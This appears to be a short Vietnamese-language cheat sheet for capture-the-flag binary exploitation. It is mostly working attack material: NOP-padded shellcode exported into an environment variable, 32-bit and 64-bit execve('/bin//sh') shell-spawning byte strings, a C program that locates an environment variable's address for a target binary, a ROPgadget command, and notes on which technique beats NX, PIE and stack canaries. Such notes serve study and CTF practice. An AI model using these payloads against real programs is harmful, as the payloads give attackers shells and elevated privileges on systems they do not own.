# SHELLCODE
Biến môi trường
- export USERNAME=`perl -e 'print "\x90"x30,"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80","\x90"x30'`

Không biến môi trường 
```
shellcode32bit = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
shellcode64bit= b'\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05'
```
Tìm địa chỉ của biến môi trường 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char * argv[]) {
        char * ptr;
        if(argc<3){
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
        }
        ptr = getenv(argv[1]);
        ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;  
        printf("%s will be at %p\n", argv[1], ptr);
}
```
Tìm pop rdi ;ret
ROPgadget --binary ./chall --only "pop rdi"

fgets : dùng p64(win) 
scanf: dùng str(win).encode

## checksec
- NX 
1. enable :(stack không thể thực thi mã.không thể chèn shellcode và ret vào ) sử dụng ROP hoặc ret2libc
2. disable: stack có thể thực thi có thể đưa shellcode vào 
- PIE
1. enable: binary được load ở địa chỉ ngẫu nhiên cần phải leak địa chỉ bằng kĩ thuật khác 
2. disable: binary có địa chỉ cố định 
- Canary
1. No canary: overflow
2. canary found: cần leak canary





